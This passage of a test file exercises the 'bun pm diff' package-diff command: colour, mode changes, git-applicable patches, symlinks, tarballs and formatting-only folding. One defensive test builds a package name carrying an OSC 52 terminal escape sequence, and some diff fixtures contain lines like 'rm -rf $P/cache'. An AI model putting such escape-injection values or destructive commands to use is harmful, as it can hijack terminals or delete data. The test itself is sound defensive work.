    const run = async (env: Record<string, string>) => {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", "./a", "./b"],
        cwd: String(dir),
        env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "100", ...env },
        stdout: "pipe",
        stderr: "pipe",
        stdin: "ignore",
      });
      const [stdout] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      return stdout;
    };
    expect(await run({ COLORFGBG: "15;0", COLORTERM: "" })).toContain("\x1b[48;5;52m");
    expect(await run({ COLORFGBG: "0;15", COLORTERM: "" })).toContain("\x1b[48;5;224m");
    expect(await run({ COLORFGBG: "0;15", COLORTERM: "truecolor" })).toContain("\x1b[48;2;255;235;233m");
    expect(await run({ COLORFGBG: "15;0", COLORTERM: "truecolor" })).toContain("\x1b[48;2;68;20;24m");
  });

  test("JSX inside .js still normalizes", async () => {
    const { text, exitCode } = await pretty({
      "a/App.js": "export const App = () => <div className='a'>hi</div>;\n",
      "b/App.js": 'export const App = () => (\n  <div className="a">hi</div>\n);\n',
    });
    expect(text).toMatch(/\nApp\.js ─+ formatting only\n/);
    expect(exitCode).toBe(0);
  });

  test.skipIf(process.platform === "win32")(
    "mode changes: newly executable files are shown and called out",
    async () => {
      using dir = tempDir("pm-diff-mode", {
        "a/run.sh": "#!/bin/sh\necho hi\n",
        "b/run.sh": "#!/bin/sh\necho hi\n",
        "b/install.js": "console.log(1)\n",
      });
      chmodSync(join(String(dir), "a/run.sh"), 0o644);
      chmodSync(join(String(dir), "b/run.sh"), 0o755);
      chmodSync(join(String(dir), "b/install.js"), 0o755);
      const run = async (env: Record<string, string | undefined>) => {
        await using p = Bun.spawn({
          cmd: [bunExe(), "pm", "diff", "./a", "./b"],
          cwd: String(dir),
          env: { ...bunEnv, ...env },
          stdout: "pipe",
          stderr: "pipe",
        });
        const [stdout, , exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
        return { stdout, exitCode };
      };
      const tty = await run({ NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120" });
      const text = tty.stdout.replace(/\x1b\[[0-9;]*[mK]/g, "");
      expect(text).toMatch(/\nrun\.sh ─+ mode 644 → 755\n/);
      expect(text).toMatch(/\ninstall\.js ─+ executable 755 new \+1\n/);
      expect(text).toContain("▲ now executable: run.sh (644 → 755)\n");
      expect(text).toContain("▲ new executable file install.js (755)\n");
      expect(tty.exitCode).toBe(0);
      // Patch mode spells it the way git does.
      const plain = await run({ NO_COLOR: "1" });
      expect(plain.stdout).toContain("diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n");
      expect(plain.stdout).toContain("diff --git a/install.js b/install.js\nnew file mode 100755\n");
      expect(plain.exitCode).toBe(0);
    },
  );

  test("the piped patch applies with git: empty files, permission changes, file names that need quotes", async () => {
    const names = ["plain.txt", "with space.txt", "dir with space/x.txt", "é.txt"];
    // This isn't valid in a Windows file name.
    if (!isWindows) names.push("t\tab.txt", 'q"uote.txt', "back\\slash.txt", "new\nline.txt");
    const a: Record<string, string> = {
      "grow.txt": "",
      "shrink.txt": "one\n",
      "run.sh": "#!/bin/sh\n",
      "old-tool.sh": "",
      "logo.bin": "\0a",
      "marked.js": "exports.a = 1;\n",
    };
    const b: Record<string, string> = {
      "grow.txt": "one\n",
      "shrink.txt": "",
      "run.sh": "#!/bin/sh\n",
      "new-tool.sh": "",
      "logo.bin": "\0b",
      "tool.bin": "\0",
      // Text, so it is in the patch, byte for byte.
      "marked.js": "/* \0 \x1b \x7f */\nexports.a = 1;\nexports.b = 2;\n",
    };
    for (const name of names) {
      a["changed-" + name] = "1\n";
      b["changed-" + name] = "2\n";
      b["added-" + name] = "";
      a["removed-" + name] = "";
    }
    using dir = tempDir("pm-diff-apply", { a, b });
    for (const executable of ["a/old-tool.sh", "b/run.sh", "b/new-tool.sh", "b/tool.bin"]) {
      chmodSync(join(String(dir), executable), 0o755);
    }
    const files = (side: string) =>
      Object.fromEntries(
        readdirSync(join(String(dir), side), { recursive: true })
          .map(path => [String(path), statSync(join(String(dir), side, String(path)))] as const)
          .filter(([, stat]) => stat.isFile())
          .map(([path, stat]) => [
            path,
            { text: readFileSync(join(String(dir), side, path), "latin1"), executable: (stat.mode & 0o100) !== 0 },
          ]),
      );
    // The patch names a binary file, it does not carry one.
    const want = { ...files("b"), "logo.bin": files("a")["logo.bin"] };
    delete want["tool.bin"];

    const { stdout, exitCode } = await diff(["./a", "./b"], String(dir));
    const json = JSON.parse((await diff(["./a", "./b", "--json"], String(dir))).stdout);
    expect(exitCode).toBe(0);

    writeFileSync(join(String(dir), "changes.patch"), stdout);
    await using git = Bun.spawn({
      cmd: ["git", "-c", "core.autocrlf=false", "apply", "../changes.patch"],
      cwd: join(String(dir), "a"),
      // The folder is no part of a repository the temporary directory may be in.
      env: { ...bunEnv, GIT_CEILING_DIRECTORIES: String(dir) },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [applyErr, applyExit] = await Promise.all([git.stderr.text(), git.exited]);
    expect(applyErr).toBe("");
    expect(files("a")).toEqual(want);
    expect(applyExit).toBe(0);

    expect(stdout).toContain(
      "diff --git a/added-plain.txt b/added-plain.txt\nnew file mode 100644\nindex 0000000..e69de29\ndiff --",
    );
    expect(stdout).toContain(
      "diff --git a/removed-plain.txt b/removed-plain.txt\ndeleted file mode 100644\nindex e69de29..0000000\ndiff --",
    );
    expect(stdout).toContain(
      'diff --git "a/changed-with space.txt" "b/changed-with space.txt"\n--- "a/changed-with space.txt"\n+++ "b/changed-with space.txt"\n@@',
    );
    // No mode line is printed under a header that git skips, because GNU patch would apply it to the file above.
    expect(stdout).toContain(
      "diff --bun a/tool.bin b/tool.bin\nnew file\nBinary files differ (0 → 1 bytes, sha256 none → 6e340b9cffb3)\n",
    );
    expect(json.files.filter((f: any) => f.path.endsWith("ed-plain.txt")).map((f: any) => [f.status, f.patch])).toEqual(
      [
        ["added", ""],
        ["modified", "@@ -1,1 +1,1 @@\n-1\n+2\n"],
        ["deleted", ""],
      ],
    );
  });

  test.skipIf(process.platform === "win32")(
    "folders: symlinked files are read through, symlinked folders skipped, unreadable files are an error",
    async () => {
      using dir = tempDir("pm-diff-links", {
        "a/index.js": "module.exports = 1;\n",
        "b/real/index.js": "module.exports = 2;\n",
        "c/index.js": "module.exports = 3;\n",
        "c/secret.js": "nope\n",
      });
      symlinkSync("real/index.js", join(String(dir), "b/index.js"));
      symlinkSync("..", join(String(dir), "b/loop"));
      symlinkSync("does-not-exist.js", join(String(dir), "b/dangling.js"));
      const run = async (args: string[]) => {
        await using p = Bun.spawn({
          cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
          cwd: String(dir),
          env: { ...bunEnv, NO_COLOR: "1" },
          stdout: "pipe",
          stderr: "pipe",
        });
        const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
        return { stdout, stderr, exitCode };
      };
      const linked = await run(["./a", "./b"]);
      expect(linked.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual(["M index.js", "A real/index.js"]);
      expect(linked.exitCode).toBe(0);
      chmodSync(join(String(dir), "c/secret.js"), 0o000);
      try {
        const denied = await run(["./a", "./c"]);
        // root reads anything; everyone else must get a loud failure, not a diff with a hole in it.
        if (!isRoot) {
          expect(denied.stderr).toContain("secret.js");
          expect(denied.exitCode).toBe(1);
        }
      } finally {
        chmodSync(join(String(dir), "c/secret.js"), 0o644);
      }
    },
  );

  test("tarball shapes: .tar, a root folder not called package/, ~/ paths, and `./x.tar 1.0.1`", async () => {
    using dir = tempDir("pm-diff-tars", {});
    // Build the archives with Bun itself so the test needs no system tar.
    await using mk = Bun.spawn({
      cmd: [
        bunExe(),
        "-e",
        `
        const v1 = { "weird-root-name/package.json": JSON.stringify({ name: "diffme", version: "1.0.0" }), "weird-root-name/index.js": "module.exports = 1;\\n" };
        await Bun.write("one.tar", await new Bun.Archive(v1).bytes());
        const v2 = { "package/package.json": JSON.stringify({ name: "diffme", version: "1.0.1" }), "package/index.js": "module.exports = 2;\\n" };
        await Bun.write("two.tgz", await new Bun.Archive(v2).bytes("gzip"));
        `,
      ],
      cwd: String(dir),
      env: bunEnv,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, mkErr, mkExit] = await Promise.all([mk.stdout.text(), mk.stderr.text(), mk.exited]);
    expect(mkErr).toBe("");
    expect(mkExit).toBe(0);
    const run = async (args: string[]) => {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
        cwd: String(dir),
        env: {
          ...bunEnv,
          NO_COLOR: "1",
          HOME: String(dir),
          USERPROFILE: String(dir),
          NPM_CONFIG_REGISTRY: registry,
          BUN_CONFIG_REGISTRY: registry,
        },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      return { stdout, stderr, exitCode };
    };
    const tars = await run(["~/one.tar", "./two.tgz"]);
    expect(tars.stderr).toBe("");
    expect(tars.stdout.split("\n")[0]).toBe("~/one.tar → ./two.tgz");
    expect(tars.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual(["M index.js", "M package.json"]);
    expect(tars.exitCode).toBe(0);
    // A tarball plus a bare version means "this package, at that version, from the registry".
    const mixed = await run(["./one.tar", "2.0.0"]);
    expect(mixed.stderr).toBe("");
    expect(mixed.stdout.split("\n")[0]).toBe("./one.tar → diffme@2.0.0");
    expect(mixed.exitCode).toBe(0);
  });

  test("a tarball entry larger than 64 MiB is read whole", async () => {
    // The tarball reader used to reject any entry over 64 MiB as "invalid archive entry size". blob.bin is the same
    // bytes on both sides, so a tarball read that is short, skips the entry, or scrambles it shows up as a blob.bin line.
    using dir = tempDir("pm-diff-big", {});
    await using mk = Bun.spawn({
      cmd: [
        bunExe(),
        "-e",
        `
        const size = 64 * 1024 * 1024 + 1;
        // Each 64 KiB chunk has its own byte value, so a chunk read out of order or twice changes the bytes.
        const blob = Buffer.alloc(size);
        for (let i = 0; i < size; i += 65536) blob.fill((i / 65536) & 0xff, i, Math.min(i + 65536, size));
        const pkg = JSON.stringify({ name: "diffme", version: "1.0.0" });
        const files = { "package/package.json": pkg, "package/index.js": "module.exports = 1;\\n", "package/blob.bin": blob };
        await Bun.write("big.tgz", await new Bun.Archive(files, { compress: "gzip" }).bytes());
        await Bun.write("pkg/package.json", pkg);
        await Bun.write("pkg/index.js", "module.exports = 2;\\n");
        await Bun.write("pkg/blob.bin", blob);
        `,
      ],
      cwd: String(dir),
      env: bunEnv,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, mkErr, mkExit] = await Promise.all([mk.stdout.text(), mk.stderr.text(), mk.exited]);
    expect(mkErr).toBe("");
    expect(mkExit).toBe(0);
    const { stdout, stderr, exitCode } = await diff(["./big.tgz", "./pkg", "--name-only"], String(dir));
    expect(stderr).toBe("");
    expect(stdout.split("\n")[0]).toBe("./big.tgz → ./pkg");
    expect(stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual(["M index.js"]);
    expect(exitCode).toBe(0);
  });
});

// The pieces underneath the terminal view — name-free symbol matching, the alignment fallbacks, key→display map
// composition, per-language fallbacks, size limits, callouts — each driven through the CLI on synthetic packages.
describe.concurrent("bun pm diff (engine invariants)", () => {
  async function pretty(files: Record<string, any>, args: string[] = [], env: Record<string, string> = {}) {
    using dir = tempDir("pm-diff-eng", files);
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./a", "./b", ...args],
      cwd: String(dir),
      env: { ...bunEnv, NO_COLOR: undefined, FORCE_COLOR: "1", COLUMNS: "120", ...env },
      stdout: "pipe",
      stderr: "pipe",
    });
    const [raw, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    return { raw, text: raw.replace(/\x1b\[[0-9;]*[mK]/g, ""), stderr, exitCode };
  }
  const changed = (text: string) =>
    text
      .split("\n")
      .filter(l => /^ +[\d:]+ │[-+~] /.test(l))
      .map(l => l.replace(/^ +[\d:]+ │/, ""));

  test("locals are matched by how they are used, not by what they are called", async () => {
    // The two names swap: name-based matching would pair reader↔reader and light up every use; use profiles pair
    // them correctly, so nothing changed.
    const a = [
      "const reader = { read() { return 1; } };",
      "const writer = { write(x) { return x; } };",
      "export function run(v) { return writer.write(reader.read() + v); }",
      "",
    ].join("\n");
    const b = [
      "const writer = { read() { return 1; } };",
      "const reader = { write(x) { return x; } };",
      "export function run(v) { return reader.write(writer.read() + v); }",
      "",
    ].join("\n");
    const same = await pretty({ "a/m.js": a, "b/m.js": b });
    expect(same.text).toMatch(/\nm\.js ─+ formatting only\n/);
    // A wrong pairing may only add noise, never hide a change: the real edit is always shown.
    const edited = await pretty({ "a/m.js": a, "b/m.js": b.replace("writer.read() + v", "writer.read() - v") });
    expect(changed(edited.text).some(l => l.startsWith("+") && l.includes("writer.read() - v"))).toBe(true);
    expect(changed(edited.text).some(l => l.startsWith("-") && l.includes("reader.read() + v"))).toBe(true);
    expect(edited.exitCode).toBe(0);
  });

  test("positional names never capture a free variable, even one already ending in `_`", async () => {
    // Free `a` and `a_` in scope; the module-level local's positional name goes `a` → `a_` → must become `a__`.
    // If it captured `a_`, both sides would print `a + a_ + a_` and a real change would fold away.
    const va = "const x = read();\nexport const g = a + a_ + x;\n";
    const vb = "const x = read();\nexport const g = a + a_ + a_;\n";
    for (const args of [[], ["--unminify"]]) {
      const { text, exitCode } = await pretty({ "a/m.js": va, "b/m.js": vb }, args);
      expect(text).toMatch(/\nm\.js ─+ (unminified )?\+1 -1\n/);
      expect(exitCode).toBe(0);
    }
  });

  test("locals pinned by direct eval keep their names; the edit next to them still shows", async () => {
    // Nothing in an eval scope may be renamed; positional names elsewhere must not collide with pinned ones.
    const va = "export function f() { var b1 = read(); var q = other(); eval('b1'); return b1 + q; }\n";
    const vb = "export function f() { var b1 = read(); var q = other(); eval('b1'); return b1 + b1; }\n";
    for (const args of [[], ["--unminify"]]) {
      const { text, exitCode } = await pretty({ "a/m.js": va, "b/m.js": vb }, args);
      expect(text).toMatch(/\nm\.js ─+ (unminified )?\+1 -1\n/);
      expect(exitCode).toBe(0);
    }
  });

  test("a package.json name that is not an npm name is never printed or looked up", async () => {
    // A hostile tarball naming itself with an OSC sequence must not reach the terminal via the header or status.
    const evil = "\u001b]52;c;aGk=\u0007pkg";
    const { text, stderr, exitCode } = await pretty({
      "a/package.json": JSON.stringify({ name: evil, version: "1.0.0" }),
      "b/package.json": JSON.stringify({ name: evil, version: "1.0.1" }),
    });
    expect(text + stderr).not.toContain("\u001b]52");
    expect(exitCode).toBe(0);
    // …and it is not accepted as a registry lookup name either.
    using dir = tempDir("pm-diff-evilname", { "p/package.json": JSON.stringify({ name: evil, version: "1.0.0" }) });
    await using p = Bun.spawn({
      cmd: [bunExe(), "pm", "diff", "./p"],
      cwd: String(dir),
      env: bunEnv,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [out, err, code] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
    expect(out + err).not.toContain("\u001b]52");
    expect(err).toContain('has no package.json "name"');
    expect(code).toBe(1);
  });

  test("a scope too big for the LCS table takes the windowed path and still folds a consistent rename", async () => {
    // 2100 × 2100 candidate cells > the 4M-cell table cap.
    const n = 2100;
    const mk = (prefix: string) =>
      Array.from({ length: n }, (_, i) => `function ${prefix}${i}(x) {\n  x++;\n  return x + ${i};\n}`).join("\n") +
      `\nmodule.exports = [${Array.from({ length: n }, (_, i) => `${prefix}${i}`).join(", ")}];\n`;
    const same = await pretty({ "a/big.js": mk("f"), "b/big.js": mk("g") });
    expect(same.text).toMatch(/\nbig\.js ─+ formatting only\n/);
    // …and one edit in the middle of it is found.
    const b = mk("g").replace("return x + 1000;", "return x * 1000;");
    const edited = await pretty({ "a/big.js": mk("f"), "b/big.js": b });
    expect(changed(edited.text)).toStrictEqual(["-   return x + 1000;", "+   return x * 1000;"]);
  });

  // The `-` / `+` lines of each file in the terminal view, or "formatting only".
  const byFile = (text: string) => {
    const files: Record<string, string[]> = {};
    let file = "";
    for (const line of text.split("\n")) {
      const header = /^(\S+) ─+ ?(.*)$/.exec(line);
      if (header) files[(file = header[1])] = header[2].includes("formatting only") ? ["formatting only"] : [];
      else if (/^ +[\d:]+ │[-+] /.test(line)) files[file].push(line.replace(/^ +[\d:]+ │/, ""));
    }
    return files;
  };
  const sides = (pairs: Record<string, string[]>) =>
    Object.fromEntries(
      Object.entries(pairs).flatMap(([name, [a, b]]) => [["a/" + name, a] as const, ["b/" + name, b] as const]),
    );

  test("lines are folded only while the file still prints the same with them folded", async () => {
    const use = (which: string) =>
      `function first(x) {\n  return check(x);\n}\nfunction second(x) {\n  return true;\n}\nexports.run = function (v) {\n  if (!${which}(v.k)) throw new Error("no");\n  return v;\n};\n`;
    const template = (line: string) => "exports.text = `\nset -e\n" + line + "\necho done\n`;\n";
    const block = (head: string, semi: string) => `${head}\n${semi}{\n  check();\n}\n`;
    const nine = [0, 1, 2, 3, 4, 5, 6, 7, 8];
    const list = (more: string) =>
      `exports.list = [\n${nine.map(i => `  /* @__PURE__ */ item(${i}),\n`).join("")}${more}];\n`;
    const children = (fifth: string) =>
      `export const a = () => (\n  <ul>\n${nine.map(i => `    <li>{${i === 4 ? fifth : `item(${i})`}}</li>\n`).join("")}  </ul>\n);\n`;
    const body = (middle: string) =>
      `const x = Number("1");\nconst y = x + 1;\n${middle}exports.a = y;\nexports.b = x;\n`;
    // Each pair is two different programs: the view has to show what `--raw` shows.
    const pairs: Record<string, string[]> = {
      "use.js": [use("first"), use("second")],
      "use.ts": [use("first").replaceAll("(x)", "(x: string)"), use("second").replaceAll("(x)", "(x: string)")],
      "use-const.js": [
        `const A = "one";\nconst B = "two";\nexports.at = A;\n`,
        `const A = "one";\nconst B = "two";\nexports.at = B;\n`,
      ],
      "use-param.js": [
        `exports.pick = function (a, b) {\n  return run(a);\n};\n`,
        `exports.pick = function (a, b) {\n  return run(b);\n};\n`,
      ],
      "use-import.mjs": [
        `import { first, second } from "./x.js";\nexport function run(v) {\n  return first(v);\n}\n`,
        `import { first, second } from "./x.js";\nexport function run(v) {\n  return second(v);\n}\n`,
      ],
      "use-and-more.js": [use("first"), use("second").replaceAll("(x)", "(x, y)")],
      "use-and-more-short.js": [
        use("first").replaceAll("first", "a").replaceAll("second", "b"),
        use("second").replaceAll("(x)", "(x, y)").replaceAll("first", "a").replaceAll("second", "b"),
      ],
      "use-added.js": [use("first").replace(/function second[^]*?\n}\n/, ""), use("second")],
      "use-global-and-more.js": [
        `const utils = { a() {} };\nexports.f = function (x) {\n  return utils.a(x);\n};\nexports.g = function (x) {\n  return utils.a(x) + 1;\n};\n`,
        `const utils$1 = { a() {} };\nexports.f = function (x) {\n  return utils.a(x);\n};\nexports.g = function (x) {\n  return utils$1.a(x) + 2;\n};\n`,
      ],
      "use-global.js": [
        `function first(x) {\n  return check(x);\n}\nexports.run = function (v) {\n  return first(v);\n};\n`,
        `function other(x) {\n  return check(x);\n}\nexports.run = function (v) {\n  return first(v);\n};\n`,
      ],
      "export-function.mjs": [
        `export function first() {\n  return 1;\n}\n`,
        `export function second() {\n  return 1;\n}\n`,
      ],
      "export-const.mjs": [`export const first = 1;\n`, `export const second = 1;\n`],
      "export-class.mjs": [`export class First {}\n`, `export class Second {}\n`],
      "semi-if.js": [block("if (ok())", ""), block("if (ok())", ";\n")],
      "semi-if-and-more.js": [block("if (ok())", ""), block("if (ok(1))", ";\n").replace("check()", "check(1)")],
      "semi-for.js": [block("for (const f of files)", ""), block("for (const f of files)", ";\n")],
      "semi-while.js": [block("while (next())", ""), block("while (next())", ";\n")],
      "semi-else.js": [block("if (a) b();\nelse", ""), block("if (a) b();\nelse", ";\n")],
      "brace.js": [
        `if (debug) {\n  log(p);\n}\ncheck(p);\nopen(p);\n`,
        `if (debug) {\n  log(p);\ncheck(p);\n}\nopen(p);\n`,
      ],
      "hole.js": [`exports.order = [\n  "a",\n  "b",\n];\n`, `exports.order = [\n  "a",\n  ,\n  "b",\n];\n`],
      "template-space.js": [template("rm -rf $P/cache"), template("rm -rf $P /cache")],
      "template-quote.js": [template(`echo "$T" > out`), template(`echo '$T' > out`)],
      "template-semi.js": [template("a b"), template("a; b")],
      "template-indent.js": [template("    run()"), template("run()")],
      "template-tagged.js": [template("a b").replace("= `", "= tag`"), template("a  b").replace("= `", "= tag`")],
      "string-continued.js": [`exports.s = "a \\\nb c";\n`, `exports.s = "a \\\nb  c";\n`],
      "jsx-text.jsx": [
        `export const a = (\n  <p>\n    x/y z\n  </p>\n);\n`,
        `export const a = (\n  <p>\n    x /y z\n  </p>\n);\n`,
      ],
      "directive-space.js": [`"use strict";\nf();\n`, `"use  strict";\nf();\n`],
      "directive-semi.js": [`"use strict";\nf();\n`, `;"use strict";\nf();\n`],
      "directive-paren.js": [`"use strict";\nf();\n`, `("use strict");\nf();\n`],
      "directive-escape.js": [`"use strict";\nf();\n`, `"use\\x20strict";\nf();\n`],
      "hashbang.js": [`#!/usr/bin/env node\nf();\n`, `#!/usr/bin/envnode\nf();\n`],
      "hashbang-space.js": [`#!/usr/bin/env node\nf();\n`, `#!/usr/bin/env  node\nf();\n`],
      "pure.js": [`/* @__PURE__ */ run("a b");\nf();\n`, `/* @__PURE__ */ run("a  b");\nf();\n`],
      "pure-added.js": [`f();\n`, `f();\n/* @__PURE__ */ String() || run("a");\n`],
      "pure-added-inside.js": [
        `exports.a = function (x) {\n  return x;\n};\n`,
        `exports.a = function (x) {\n  /*#__PURE__*/ String() || run("a");\n  return x;\n};\n`,
      ],
      "pure-changed.js": [`/* @__PURE__ */ String() || first();\n`, `/* @__PURE__ */ String() || second();\n`],
      "pure-removed.js": [`f();\n/* @__PURE__ */ String() || first();\n`, `f();\n`],
      "pure-element.js": [list(""), list(`  /* @__PURE__ */ run("a"),\n`)],
      "children.jsx": [children("item(4)"), children(`run("a")`)],
      "directive-inside.js": [
        `exports.f = function () {\n  "use strict";\n  return this;\n};\n`,
        `exports.f = function () {\n  ;"use strict";\n  return this;\n};\n`,
      ],
      "directive-inside-removed.js": [
        `exports.f = function () {\n  "use strict";\n  return this;\n};\n`,
        `exports.f = function () {\n  return this;\n};\n`,
      ],
      "export-swap.mjs": [
        `export function first() {\n  return true;\n}\nexport function second() {\n  return false;\n}\n`,
        `export function second() {\n  return true;\n}\nexport function first() {\n  return false;\n}\n`,
      ],
      "export-swap-const.mjs": [
        `export const A = "one";\nexport const B = "two";\n`,
        `export const B = "one";\nexport const A = "two";\n`,
      ],
      "export-swap-pattern.mjs": [`export const [a, b] = [true, false];\n`, `export const [b, a] = [true, false];\n`],
      "export-swap-enum.ts": [
        `export enum A {\n  X = 1,\n}\nexport enum B {\n  X = 2,\n}\n`,
        `export enum B {\n  X = 1,\n}\nexport enum A {\n  X = 2,\n}\n`,
      ],
      "export-swap-namespace.ts": [
        `export namespace A {\n  export const x = 1;\n}\nexport namespace B {\n  export const x = 2;\n}\n`,
        `export namespace B {\n  export const x = 1;\n}\nexport namespace A {\n  export const x = 2;\n}\n`,
      ],
      "export-equals.ts": [
        `function a() {\n  return 1;\n}\nfunction b() {\n  return 2;\n}\nexport = a;\n`,
        `function a() {\n  return 1;\n}\nfunction b() {\n  return 2;\n}\nexport = b;\n`,
      ],
      // The same statements in another order, or once more.
      "order.js": [
        `open({ host: "h", port: 1, tls: true, retry: 0 });\ncheck();\n`,
        `check();\nopen({ host: "h", port: 1, tls: true, retry: 0 });\n`,
      ],
      "order-assign.js": [
        `let t;\nt = { a: 1, b: 2, c: 3, d: 4 };\nt = null;\nexports.t = t;\n`,
        `let t;\nt = null;\nt = { a: 1, b: 2, c: 3, d: 4 };\nexports.t = t;\n`,
      ],
      "order-return.js": [
        `exports.f = function (a, b) {\n  if (a) return 1;\n  if (b) return 2;\n};\n`,
        `exports.f = function (a, b) {\n  if (b) return 2;\n  if (a) return 1;\n};\n`,
      ],
      "twice.js": [`start();\npay(card);\nend();\n`, `start();\npay( card );\npay(card);\nend();\n`],
      // Line ends that only JavaScript counts.
      "separator-comment.js": [`/* a   b */\n` + body(""), `/* a   b */\n` + body(`run("a");\n`)],
      "separator-string.js": [`const s = " ";\n` + body(""), `const s = " ";\n` + body(`run("a");\n`)],
      "separator-paragraph.js": [`/* a   b */\n` + body(""), `/* a   b */\n` + body(`run("a");\n`)],
      "separator-cr.js": [`/* a \r b */\n` + body(""), `/* a \r b */\n` + body(`run("a");\n`)],
      "separator-removed.js": [`/* a   b */\n` + body(`run("a");\n`), `/* a   b */\n` + body("")],
      "separator-added.js": [`/* a 1 */\n` + body(""), `/* a 2  */\n` + body(`run("a");\n`)],
      // A line break that ends a statement, or no longer does.
      "break-return.js": [`function f(v) {\n  return v;\n}\nf();\n`, `function f(v) {\n  return\n  v;\n}\nf();\n`],
      "break-break.js": [
        `a: for (;;) {\n  for (;;) {\n    break a;\n  }\n}\n`,
        `a: for (;;) {\n  for (;;) {\n    break\n    a;\n  }\n}\n`,
      ],
      "break-continue.js": [
        `a: for (; x(); ) {\n  for (; y(); ) {\n    continue a;\n  }\n}\n`,
        `a: for (; x(); ) {\n  for (; y(); ) {\n    continue\n    a;\n  }\n}\n`,
      ],
      "break-yield.js": [`function* g(v) {\n  yield v;\n}\ng();\n`, `function* g(v) {\n  yield\n  v;\n}\ng();\n`],
      "break-async.js": [`var async;\nasync function f() {}\nf();\n`, `var async;\nasync\nfunction f() {}\nf();\n`],
      "break-postfix.js": [`let a = 1, b = 2;\na++\nb\nuse(a, b);\n`, `let a = 1, b = 2;\na\n++b\nuse(a, b);\n`],
      "break-paren.js": [`const a = f;\n(g)();\nuse(a);\n`, `const a = f\n(g)();\nuse(a);\n`],
      "break-bracket.js": [`const a = f;\n[1].forEach(g);\nuse(a);\n`, `const a = f\n[1].forEach(g);\nuse(a);\n`],
      "break-template.js": ["const a = f;\n`x`.length;\nuse(a);\n", "const a = f\n`x`.length;\nuse(a);\n"],
      "break-regex.js": [`let a = b;\n/x/g.exec(c);\nuse(a);\n`, `let a = b\n/x/g.exec(c);\nuse(a);\n`],
    };
    const [view, raw] = await Promise.all([pretty(sides(pairs)), pretty(sides(pairs), ["--raw"])]);
    expect(Object.values(byFile(raw.text)).filter(lines => lines.length > 0).length).toBe(Object.keys(pairs).length);
    expect(byFile(view.text)).toEqual(byFile(raw.text));
    expect(view.exitCode).toBe(0);

    // Each of these is the same program twice, except for the edit mentioned. The rest stays folded.
    const same: Record<string, string[]> = {
      "layout.js": [`exports.a = function (x) { return x + 1 }\n`, `exports.a = function (x) {\n  return x + 1;\n};\n`],
      "names.js": [
        `module.exports = function (xs) {\n  let t = 0;\n  for (const x of xs) t += x;\n  return t;\n};\n`,
        `module.exports = function (a) {\n  let n = 0;\n  for (const v of a) n += v;\n  return n;\n};\n`,
      ],
      "hashbang.js": [`#!/usr/bin/env node\nf('a')\n`, `#!/usr/bin/env node\nf("a");\n`],
      "directive.js": [
        `'use strict'\nexports.f = function () { 'use strict'; return this }\n`,
        `"use strict";\nexports.f = function () {\n  "use strict";\n  return this;\n};\n`,
      ],
      "await.mjs": [
        `await ready;\nexport function f(a){return a+1}\n`,
        `await ready;\nexport function f(a) {\n  return a + 1;\n}\n`,
      ],
      "separator.js": [
        `/* a   b */\nexports.a = function (x) { return x + 1 }\n`,
        `/* a   b */\nexports.a = function (x) {\n  return x + 1;\n};\n`,
      ],
      "export.mjs": [
        `const t = 1;\nexport function first(a) { return a + t }\n`,
        `const u = 1;\nexport function first(b) {\n  return b + u;\n}\n`,
      ],
      "layout-and-edit.js": [
        `const s = 'a';\nexports.f = function (x) { return x + s }\nexports.g = 1;\n`,
        `const s = "a";\nexports.f = function (x) {\n  return x + s;\n};\nexports.g = 2;\n`,
      ],
      "names-and-edit.js": [
        `const utils = { a() {} };\nexports.f = function (x) {\n  return utils.a(x);\n};\nexports.g = 1;\n`,
        `const utils$1 = { a() {} };\nexports.f = function (x) {\n  return utils$1.a(x);\n};\nexports.g = 2;\n`,
      ],
      "names-and-edit-of-a-use.js": [
        `const utils = { a() {} };\nexports.f = function (x) {\n  return utils.a(x);\n};\nexports.g = function (x) {\n  return utils.a(x) + 1;\n};\n`,
        `const utils$1 = { a() {} };\nexports.f = function (x) {\n  return utils$1.a(x);\n};\nexports.g = function (x) {\n  return utils$1.a(x) + 2;\n};\n`,
      ],
    };
    expect(byFile((await pretty(sides(same))).text)).toEqual({
      "layout.js": ["formatting only"],
      "names.js": ["formatting only"],
      "hashbang.js": ["formatting only"],
      "directive.js": ["formatting only"],
      "await.mjs": ["formatting only"],
      "separator.js": ["formatting only"],
      "export.mjs": ["formatting only"],
      "layout-and-edit.js": ["- exports.g = 1;", "+ exports.g = 2;"],
      "names-and-edit.js": ["- exports.g = 1;", "+ exports.g = 2;"],
      "names-and-edit-of-a-use.js": ["-   return utils.a(x) + 1;", "+   return utils$1.a(x) + 2;"],
    });
  });

  test("minified: the hashbang and exported names are compared too", async () => {
    const long = "function(n,t){" + Array.from({ length: 40 }, (_, i) => `n.p${i}=t+${i};`).join("") + "return n}\n";
    const files = byFile(
      (
        await pretty(
          sides({
            "bin.min.js": ["#!/usr/bin/env node\nmodule.exports=" + long, "#!/bin/sh\nmodule.exports=" + long],
            "export.min.mjs": ["export function a" + long.slice(8), "export function b" + long.slice(8)],
          }),
        )
      ).text,
    );
    expect(files["bin.min.js"]).toEqual(["- #!/usr/bin/env node", "+ #!/bin/sh"]);
    expect(files["export.min.mjs"].map(line => line.replace(/\(.*/, ""))).toEqual([
      "- export function a",
      "+ export function b",
    ]);
  });

  test("minified: the re-print on screen starts where the file starts", async () => {
    const long =
